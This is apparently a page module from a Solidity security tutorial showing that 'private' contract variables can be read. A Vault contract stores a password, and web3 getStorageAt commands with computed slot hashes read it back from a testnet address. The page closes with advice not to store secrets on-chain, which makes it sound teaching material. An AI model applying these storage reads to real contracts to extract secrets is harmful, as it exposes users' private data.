// metadata
export const version = "0.8.24"
export const title = "Accessing Private Data"
export const description =
  "An example of accessing private data from a Solidity smart contract"

export const keywords = [
  "hack",
  "security",
  "access",
  "accessing",
  "private",
  "data",
  "storage",
]

export const codes = [
  {
    fileName: "Vault.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNDsKCi8qCk5vdGU6IGNhbm5vdCB1c2Ugd2ViMyBvbiBKVk0sIHNvIHVzZSB0aGUgY29udHJhY3QgZGVwbG95ZWQgb24gR29lcmxpCk5vdGU6IGJyb3dzZXIgV2ViMyBpcyBvbGQgc28gdXNlIFdlYjMgZnJvbSB0cnVmZmxlIGNvbnNvbGUKCkNvbnRyYWN0IGRlcGxveWVkIG9uIEdvZXJsaQoweDUzNEU0Q2UwZmZGNzc5NTEzNzkzY2ZkNzAzMDhBRjE5NTgyN0JEMzEKKi8KCi8qCiMgU3RvcmFnZQotIDIgKiogMjU2IHNsb3RzCi0gMzIgYnl0ZXMgZm9yIGVhY2ggc2xvdAotIGRhdGEgaXMgc3RvcmVkIHNlcXVlbnRpYWxseSBpbiB0aGUgb3JkZXIgb2YgZGVjbGFyYXRpb24KLSBzdG9yYWdlIGlzIG9wdGltaXplZCB0byBzYXZlIHNwYWNlLiBJZiBuZWlnaGJvcmluZyB2YXJpYWJsZXMgZml0IGluIGEgc2luZ2xlCiAgMzIgYnl0ZXMsIHRoZW4gdGhleSBhcmUgcGFja2VkIGludG8gdGhlIHNhbWUgc2xvdCwgc3RhcnRpbmcgZnJvbSB0aGUgcmlnaHQKKi8KCmNvbnRyYWN0IFZhdWx0IHsKICAgIC8vIHNsb3QgMAogICAgdWludDI1NiBwdWJsaWMgY291bnQgPSAxMjM7CiAgICAvLyBzbG90IDEKICAgIGFkZHJlc3MgcHVibGljIG93bmVyID0gbXNnLnNlbmRlcjsKICAgIGJvb2wgcHVibGljIGlzVHJ1ZSA9IHRydWU7CiAgICB1aW50MTYgcHVibGljIHUxNiA9IDMxOwogICAgLy8gc2xvdCAyCiAgICBieXRlczMyIHByaXZhdGUgcGFzc3dvcmQ7CgogICAgLy8gY29uc3RhbnRzIGRvIG5vdCB1c2Ugc3RvcmFnZQogICAgdWludDI1NiBwdWJsaWMgY29uc3RhbnQgc29tZUNvbnN0ID0gMTIzOwoKICAgIC8vIHNsb3QgMywgNCwgNSAob25lIGZvciBlYWNoIGFycmF5IGVsZW1lbnQpCiAgICBieXRlczMyWzNdIHB1YmxpYyBkYXRhOwoKICAgIHN0cnVjdCBVc2VyIHsKICAgICAgICB1aW50MjU2IGlkOwogICAgICAgIGJ5dGVzMzIgcGFzc3dvcmQ7CiAgICB9CgogICAgLy8gc2xvdCA2IC0gbGVuZ3RoIG9mIGFycmF5CiAgICAvLyBzdGFydGluZyBmcm9tIHNsb3QgaGFzaCg2KSAtIGFycmF5IGVsZW1lbnRzCiAgICAvLyBzbG90IHdoZXJlIGFycmF5IGVsZW1lbnQgaXMgc3RvcmVkID0ga2VjY2FrMjU2KHNsb3QpKSArIChpbmRleCAqIGVsZW1lbnRTaXplKQogICAgLy8gd2hlcmUgc2xvdCA9IDYgYW5kIGVsZW1lbnRTaXplID0gMiAoMSAodWludCkgKyAgMSAoYnl0ZXMzMikpCiAgICBVc2VyW10gcHJpdmF0ZSB1c2VyczsKCiAgICAvLyBzbG90IDcgLSBlbXB0eQogICAgLy8gZW50cmllcyBhcmUgc3RvcmVkIGF0IGhhc2goa2V5LCBzbG90KQogICAgLy8gd2hlcmUgc2xvdCA9IDcsIGtleSA9IG1hcCBrZXkKICAgIG1hcHBpbmcodWludDI1NiA9PiBVc2VyKSBwcml2YXRlIGlkVG9Vc2VyOwoKICAgIGNvbnN0cnVjdG9yKGJ5dGVzMzIgX3Bhc3N3b3JkKSB7CiAgICAgICAgcGFzc3dvcmQgPSBfcGFzc3dvcmQ7CiAgICB9CgogICAgZnVuY3Rpb24gYWRkVXNlcihieXRlczMyIF9wYXNzd29yZCkgcHVibGljIHsKICAgICAgICBVc2VyIG1lbW9yeSB1c2VyID0gVXNlcih7aWQ6IHVzZXJzLmxlbmd0aCwgcGFzc3dvcmQ6IF9wYXNzd29yZH0pOwoKICAgICAgICB1c2Vycy5wdXNoKHVzZXIpOwogICAgICAgIGlkVG9Vc2VyW3VzZXIuaWRdID0gdXNlcjsKICAgIH0KCiAgICBmdW5jdGlvbiBnZXRBcnJheUxvY2F0aW9uKHVpbnQyNTYgc2xvdCwgdWludDI1NiBpbmRleCwgdWludDI1NiBlbGVtZW50U2l6ZSkKICAgICAgICBwdWJsaWMKICAgICAgICBwdXJlCiAgICAgICAgcmV0dXJucyAodWludDI1NikKICAgIHsKICAgICAgICByZXR1cm4KICAgICAgICAgICAgdWludDI1NihrZWNjYWsyNTYoYWJpLmVuY29kZVBhY2tlZChzbG90KSkpICsgKGluZGV4ICogZWxlbWVudFNpemUpOwogICAgfQoKICAgIGZ1bmN0aW9uIGdldE1hcExvY2F0aW9uKHVpbnQyNTYgc2xvdCwgdWludDI1NiBrZXkpCiAgICAgICAgcHVibGljCiAgICAgICAgcHVyZQogICAgICAgIHJldHVybnMgKHVpbnQyNTYpCiAgICB7CiAgICAgICAgcmV0dXJuIHVpbnQyNTYoa2VjY2FrMjU2KGFiaS5lbmNvZGVQYWNrZWQoa2V5LCBzbG90KSkpOwogICAgfQp9CgovKgpzbG90IDAgLSBjb3VudAp3ZWIzLmV0aC5nZXRTdG9yYWdlQXQoIjB4NTM0RTRDZTBmZkY3Nzk1MTM3OTNjZmQ3MDMwOEFGMTk1ODI3QkQzMSIsIDAsIGNvbnNvbGUubG9nKQpzbG90IDEgLSB1MTYsIGlzVHJ1ZSwgb3duZXIKd2ViMy5ldGguZ2V0U3RvcmFnZUF0KCIweDUzNEU0Q2UwZmZGNzc5NTEzNzkzY2ZkNzAzMDhBRjE5NTgyN0JEMzEiLCAxLCBjb25zb2xlLmxvZykKc2xvdCAyIC0gcGFzc3dvcmQKd2ViMy5ldGguZ2V0U3RvcmFnZUF0KCIweDUzNEU0Q2UwZmZGNzc5NTEzNzkzY2ZkNzAzMDhBRjE5NTgyN0JEMzEiLCAyLCBjb25zb2xlLmxvZykKCnNsb3QgNiAtIGFycmF5IGxlbmd0aApnZXRBcnJheUxvY2F0aW9uKDYsIDAsIDIpCndlYjMudXRpbHMubnVtYmVyVG9IZXgoIjExMTQxNDA3NzgxNTg2MzQwMDUxMDAwNDA2NDYyOTk3MzU5NTk2MTU3OTE3MzY2NTU4OTIyNDIwMzUwMzY2MjE0OTM3MzcyNDk4NjY4NyIpCk5vdGU6IFdlIGNhbiBhbHNvIHVzZSB3ZWIzIHRvIGdldCBkYXRhIGxvY2F0aW9uCndlYjMudXRpbHMuc29saWRpdHlTaGEzKHsgdHlwZTogInVpbnQiLCB2YWx1ZTogNiB9KQoxc3QgdXNlcgp3ZWIzLmV0aC5nZXRTdG9yYWdlQXQoIjB4NTM0RTRDZTBmZkY3Nzk1MTM3OTNjZmQ3MDMwOEFGMTk1ODI3QkQzMSIsICIweGY2NTIyMjIzMTNlMjg0NTk1MjhkOTIwYjY1MTE1YzE2YzA0ZjNlZmM4MmFhZWRjOTdiZTU5ZjNmMzc3YzBkM2YiLCBjb25zb2xlLmxvZykKd2ViMy5ldGguZ2V0U3RvcmFnZUF0KCIweDUzNEU0Q2UwZmZGNzc5NTEzNzkzY2ZkNzAzMDhBRjE5NTgyN0JEMzEiLCAiMHhmNjUyMjIyMzEzZTI4NDU5NTI4ZDkyMGI2NTExNWMxNmMwNGYzZWZjODJhYWVkYzk3YmU1OWYzZjM3N2MwZDQwIiwgY29uc29sZS5sb2cpCk5vdGU6IHVzZSB3ZWIzLnRvQXNjaWkgdG8gY29udmVydCBieXRlczMyIHRvIGFscGhhYmV0CjJuZCB1c2VyCndlYjMuZXRoLmdldFN0b3JhZ2VBdCgiMHg1MzRFNENlMGZmRjc3OTUxMzc5M2NmZDcwMzA4QUYxOTU4MjdCRDMxIiwgIjB4ZjY1MjIyMjMxM2UyODQ1OTUyOGQ5MjBiNjUxMTVjMTZjMDRmM2VmYzgyYWFlZGM5N2JlNTlmM2YzNzdjMGQ0MSIsIGNvbnNvbGUubG9nKQp3ZWIzLmV0aC5nZXRTdG9yYWdlQXQoIjB4NTM0RTRDZTBmZkY3Nzk1MTM3OTNjZmQ3MDMwOEFGMTk1ODI3QkQzMSIsICIweGY2NTIyMjIzMTNlMjg0NTk1MjhkOTIwYjY1MTE1YzE2YzA0ZjNlZmM4MmFhZWRjOTdiZTU5ZjNmMzc3YzBkNDIiLCBjb25zb2xlLmxvZykKCnNsb3QgNyAtIGVtcHR5CmdldE1hcExvY2F0aW9uKDcsIDEpCndlYjMudXRpbHMubnVtYmVyVG9IZXgoIjgxMjIyMTkxOTg2MjI2ODA5MTAzMjc5MTE5OTk0NzA3ODY4MzIyODU1NzQxODE5OTA1OTA0NDE3OTUzMDkyNjY2Njk5MDk2OTYzMTEyIikKTm90ZTogV2UgY2FuIGFsc28gdXNlIHdlYjMgdG8gZ2V0IGRhdGEgbG9jYXRpb24Kd2ViMy51dGlscy5zb2xpZGl0eVNoYTMoeyB0eXBlOiAidWludCIsIHZhbHVlOiAxIH0sIHt0eXBlOiAidWludCIsIHZhbHVlOiA3fSkKdXNlciAxCndlYjMuZXRoLmdldFN0b3JhZ2VBdCgiMHg1MzRFNENlMGZmRjc3OTUxMzc5M2NmZDcwMzA4QUYxOTU4MjdCRDMxIiwgIjB4YjM5MjIxYWNlMDUzNDY1ZWMzNDUzY2UyYjM2NDMwYmQxMzhiOTk3ZWNlYTI1YzEwNDNkYTBjMzY2ODEyYjgyOCIsIGNvbnNvbGUubG9nKQp3ZWIzLmV0aC5nZXRTdG9yYWdlQXQoIjB4NTM0RTRDZTBmZkY3Nzk1MTM3OTNjZmQ3MDMwOEFGMTk1ODI3QkQzMSIsICIweGIzOTIyMWFjZTA1MzQ2NWVjMzQ1M2NlMmIzNjQzMGJkMTM4Yjk5N2VjZWEyNWMxMDQzZGEwYzM2NjgxMmI4MjkiLCBjb25zb2xlLmxvZykKKi8K",
  },
]

const html = `<h3>Vulnerability</h3>
<p>All data on a smart contract can be read.</p>
<p>Let&#39;s see how we can read <code>private</code> data. In the process you will learn how Solidity stores state variables.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.24;</span>

<span class="hljs-comment">/*
Note: cannot use web3 on JVM, so use the contract deployed on Goerli
Note: browser Web3 is old so use Web3 from truffle console

Contract deployed on Goerli
0x534E4Ce0ffF779513793cfd70308AF195827BD31
*/</span>

<span class="hljs-comment">/*
# Storage
- 2 ** 256 slots
- 32 bytes for each slot
- data is stored sequentially in the order of declaration
- storage is optimized to save space. If neighboring variables fit in a single
  32 bytes, then they are packed into the same slot, starting from the right
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Vault</span> </span>{
    <span class="hljs-comment">// slot 0</span>
    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> count <span class="hljs-operator">=</span> <span class="hljs-number">123</span>;
    <span class="hljs-comment">// slot 1</span>
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">public</span> isTrue <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">uint16</span> <span class="hljs-keyword">public</span> u16 <span class="hljs-operator">=</span> <span class="hljs-number">31</span>;
    <span class="hljs-comment">// slot 2</span>
    <span class="hljs-keyword">bytes32</span> <span class="hljs-keyword">private</span> password;

    <span class="hljs-comment">// constants do not use storage</span>
    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">constant</span> someConst <span class="hljs-operator">=</span> <span class="hljs-number">123</span>;

    <span class="hljs-comment">// slot 3, 4, 5 (one for each array element)</span>
    <span class="hljs-keyword">bytes32</span>[<span class="hljs-number">3</span>] <span class="hljs-keyword">public</span> data;

    <span class="hljs-keyword">struct</span> <span class="hljs-title">User</span> {
        <span class="hljs-keyword">uint256</span> id;
        <span class="hljs-keyword">bytes32</span> password;
    }

    <span class="hljs-comment">// slot 6 - length of array</span>
    <span class="hljs-comment">// starting from slot hash(6) - array elements</span>
    <span class="hljs-comment">// slot where array element is stored = keccak256(slot)) + (index * elementSize)</span>
    <span class="hljs-comment">// where slot = 6 and elementSize = 2 (1 (uint) +  1 (bytes32))</span>
    User[] <span class="hljs-keyword">private</span> users;

    <span class="hljs-comment">// slot 7 - empty</span>
    <span class="hljs-comment">// entries are stored at hash(key, slot)</span>
    <span class="hljs-comment">// where slot = 7, key = map key</span>
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">uint256</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> User) <span class="hljs-keyword">private</span> idToUser;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">bytes32</span> _password</span>) </span>{
        password <span class="hljs-operator">=</span> _password;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addUser</span>(<span class="hljs-params"><span class="hljs-keyword">bytes32</span> _password</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        User <span class="hljs-keyword">memory</span> user <span class="hljs-operator">=</span> User({id: users.<span class="hljs-built_in">length</span>, password: _password});

        users.<span class="hljs-built_in">push</span>(user);
        idToUser[user.id] <span class="hljs-operator">=</span> user;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getArrayLocation</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> slot, <span class="hljs-keyword">uint256</span> index, <span class="hljs-keyword">uint256</span> elementSize</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
        <span class="hljs-title"><span class="hljs-keyword">pure</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)
    </span>{
        <span class="hljs-keyword">return</span>
            <span class="hljs-keyword">uint256</span>(<span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(slot))) <span class="hljs-operator">+</span> (index <span class="hljs-operator">*</span> elementSize);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getMapLocation</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> slot, <span class="hljs-keyword">uint256</span> key</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
        <span class="hljs-title"><span class="hljs-keyword">pure</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">uint256</span>(<span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(key, slot)));
    }
}

<span class="hljs-comment">/*
slot 0 - count
web3.eth.getStorageAt("0x534E4Ce0ffF779513793cfd70308AF195827BD31", 0, console.log)
slot 1 - u16, isTrue, owner
web3.eth.getStorageAt("0x534E4Ce0ffF779513793cfd70308AF195827BD31", 1, console.log)
slot 2 - password
web3.eth.getStorageAt("0x534E4Ce0ffF779513793cfd70308AF195827BD31", 2, console.log)

slot 6 - array length
getArrayLocation(6, 0, 2)
web3.utils.numberToHex("111414077815863400510004064629973595961579173665589224203503662149373724986687")
Note: We can also use web3 to get data location
web3.utils.soliditySha3({ type: "uint", value: 6 })
1st user
web3.eth.getStorageAt("0x534E4Ce0ffF779513793cfd70308AF195827BD31", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f", console.log)
web3.eth.getStorageAt("0x534E4Ce0ffF779513793cfd70308AF195827BD31", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d40", console.log)
Note: use web3.toAscii to convert bytes32 to alphabet
2nd user
web3.eth.getStorageAt("0x534E4Ce0ffF779513793cfd70308AF195827BD31", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d41", console.log)
web3.eth.getStorageAt("0x534E4Ce0ffF779513793cfd70308AF195827BD31", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d42", console.log)

slot 7 - empty
getMapLocation(7, 1)
web3.utils.numberToHex("81222191986226809103279119994707868322855741819905904417953092666699096963112")
Note: We can also use web3 to get data location
web3.utils.soliditySha3({ type: "uint", value: 1 }, {type: "uint", value: 7})
user 1
web3.eth.getStorageAt("0x534E4Ce0ffF779513793cfd70308AF195827BD31", "0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b828", console.log)
web3.eth.getStorageAt("0x534E4Ce0ffF779513793cfd70308AF195827BD31", "0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b829", console.log)
*/</span>
</code></pre><h3>Preventative Techniques</h3>
<ul>
<li>Don&#39;t store sensitive information on the blockchain.</li>
</ul>
`

export default html
